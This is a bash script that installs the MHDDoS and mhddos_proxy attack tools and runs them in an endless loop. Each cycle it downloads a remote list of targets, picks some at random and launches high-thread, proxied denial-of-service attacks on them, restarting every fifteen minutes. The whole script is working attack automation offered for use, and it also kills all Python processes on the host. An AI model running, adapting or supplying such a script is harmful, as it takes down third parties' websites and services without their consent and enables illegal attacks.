#!/bin/bash

# Install git, python3 etc.
sudo apt update -y
sudo apt install git python3 python3-pip-y
sudo pip install --upgrade pip

#Install latest version of mhddos_proxy and MHDDoS
cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
sudo git clone https://github.com/MHProDev/MHDDoS.git
sudo python3 -m pip install -r MHDDoS/requirements.txt
cd ~

#Just in case kill previous copies of mhddos and mhddos_proxy
pkill -f start.py; pkill -f runner.py

##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.


num_of_copies="${1:-2}"
threads="${1:-1000}"
threads="-t $threads"
rpc="${2:-50}"
rpc="--rpc $rpc"
## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
restart_interval="${3:-900}"


proxy_interval=3600
proxy_interval="-p $proxy_interval"


# Restart attacks and update targets list every 15 minutes (by default)
while true
do
   # Get number of targets in runner_targets.
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^[^#]" | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from list on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
   echo -e "random number(s): " $random_numbers "\n"
   
   # Print all randomly selected targets on screen
   echo -e "Choosen target(s):\n"
   for i in $random_numbers
   do
             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
             echo -e "    "$target"\n"
   done
      
   # Launch multiple mhddos_proxy instances with different targets.
   for i in $random_numbers
   do
            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
           
            echo "command line"
            echo $cmd_line
            echo "full cmd"
            
            echo $proxy_interval $threads $rpc
            python3 ~/mhddos_proxy/$cmd_line $proxy_interval $threads $rpc
   done
echo -e "#####################################\n"
sleep $restart_interval
echo -e "RESTARTING\n"
pkill -f start.py #In theory should work but doesn't give good results
pkill python3 #It just works (c)
done
